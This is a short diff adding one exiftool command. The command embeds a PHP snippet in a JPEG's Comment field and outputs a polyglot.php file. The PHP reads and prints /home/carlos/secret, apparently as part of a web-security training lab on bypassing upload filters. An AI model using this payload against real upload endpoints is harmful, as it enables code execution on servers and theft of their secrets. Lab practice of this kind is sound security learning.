@@ -1,0 +1,3 @@
+
+
+.\exiftool.exe -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" .\20220104_171937.jpg -o polyglot.php
